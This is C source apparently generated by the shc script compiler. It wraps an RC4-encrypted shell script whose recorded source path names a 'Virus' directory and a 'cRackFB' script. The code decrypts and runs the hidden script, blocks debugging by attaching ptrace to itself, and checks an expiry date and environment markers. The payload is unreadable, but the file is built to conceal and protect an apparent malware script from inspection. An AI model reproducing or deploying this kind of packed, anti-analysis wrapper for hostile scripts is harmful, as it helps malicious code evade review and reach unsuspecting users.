#if 0
	shc Version 3.8.7, Generic Script Compiler
	Copyright (c) 1994-2009 Francisco Rosales <frosal@fi.upm.es>

	./shc -f /root/Virus/Linux/cRackFB-Linux.sh 
#endif

static  char data [] = 
#define      inlo_z	3
#define      inlo	((&data[0]))
	"\135\164\257"
#define      text_z	45
#define      text	((&data[10]))
	"\040\057\110\251\301\153\307\137\120\325\265\205\100\275\154\043"
	"\274\021\233\257\214\275\275\167\167\073\262\340\077\123\117\137"
	"\035\125\121\231\335\326\103\335\267\205\200\111\247\201\314\016"
	"\175\324\262\146\260\152"
#define      msg2_z	19
#define      msg2	((&data[57]))
	"\071\227\116\270\122\336\157\201\002\150\170\265\166\015\143\371"
	"\142\123\023\271"
#define      xecc_z	15
#define      xecc	((&data[78]))
	"\070\070\367\344\220\063\024\274\271\340\350\304\073\243\045\331"
#define      lsto_z	1
#define      lsto	((&data[93]))
	"\005"
#define      shll_z	8
#define      shll	((&data[96]))
	"\241\120\027\263\113\240\055\217\267\151"
#define      tst1_z	22
#define      tst1	((&data[108]))
	"\073\126\070\133\203\123\041\076\041\032\025\154\322\010\307\354"
	"\145\231\262\001\022\001\101\200\173\065"
#define      chk1_z	22
#define      chk1	((&data[133]))
	"\107\355\314\131\364\133\056\342\227\011\303\166\213\230\322\356"
	"\372\274\257\274\314\277\251\057\134"
#define      chk2_z	19
#define      chk2	((&data[156]))
	"\023\016\355\235\335\222\310\031\363\360\165\310\305\001\047\042"
	"\020\306\132\215\215\050"
#define      rlax_z	1
#define      rlax	((&data[177]))
	"\161"
#define      opts_z	1
#define      opts	((&data[178]))
	"\330"
#define      date_z	1
#define      date	((&data[179]))
	"\045"
#define      tst2_z	19
#define      tst2	((&data[181]))
	"\263\143\053\221\132\136\253\164\003\323\175\152\330\235\300\062"
	"\134\072\214\312"
#define      pswd_z	256
#define      pswd	((&data[203]))
	"\102\105\112\145\260\061\153\210\354\271\134\304\065\256\254\351"
	"\307\032\037\016\370\147\223\163\150\174\057\000\317\315\172\372"
	"\306\117\140\167\201\313\377\155\204\134\062\272\013\336\244\322"
	"\370\303\340\361\053\164\144\223\360\224\223\300\142\016\273\050"
	"\136\033\240\337\346\240\115\153\374\177\045\010\136\311\333\126"
	"\215\274\107\270\060\254\114\041\100\340\342\242\356\235\313\114"
	"\271\153\054\237\013\172\013\010\372\060\020\130\371\354\257\206"
	"\250\366\077\330\243\213\372\344\154\334\207\133\172\122\247\063"
	"\276\324\323\311\116\336\322\110\017\343\241\010\317\120\217\167"
	"\107\316\120\352\132\113\316\306\047\126\042\242\250\312\326\147"
	"\236\251\061\355\210\003\066\227\347\327\240\266\047\057\056\156"
	"\376\177\131\131\312\050\040\362\176\102\225\047\014\153\216\252"
	"\024\277\230\235\303\316\064\253\245\325\141\314\004\220\073\003"
	"\020\224\134\332\275\174\315\073\276\142\143\312\316\361\165\342"
	"\261\015\200\165\333\265\040\200\212\202\115\217\023\211\222\043"
	"\036\356\376\333\152\313\027\051\056\172\363\374\153\150\337\035"
	"\166\140\222\310\307\117\020\264\034\010\013\213\034\231\264\164"
	"\213\020\005\336\015\067\162\306\201\247\320\064\223\335\043\325"
	"\043\156\236\352\275\256\237\331\266\253\145\322\104\031\107\317"
	"\052\114\256\067\204\040\376\006\310\317\073\134\254\136\061"
#define      msg1_z	42
#define      msg1	((&data[527]))
	"\272\212\176\131\144\064\005\311\030\137\165\063\047\031\244\270"
	"\224\312\230\351\113\201\056\226\342\201\062\036\054\155\350\313"
	"\311\262\212\373\206\275\166\251\157\233\267\073\302\327\045\301"
	"\036\172\007\111\343\116\031\015\233\307"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	0	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		if (text_z < hide_z) {
			/* Prepend spaces til a hide_z script size. */
			scrpt = malloc(hide_z);
			if (!scrpt)
				return 0;
			memset(scrpt, (int) ' ', hide_z);
			memcpy(&scrpt[hide_z - text_z], text, text_z);
		} else {
			scrpt = text;	/* Script text */
		}
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, argv[0]);
		} else {
			scrpt = argv[0];
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
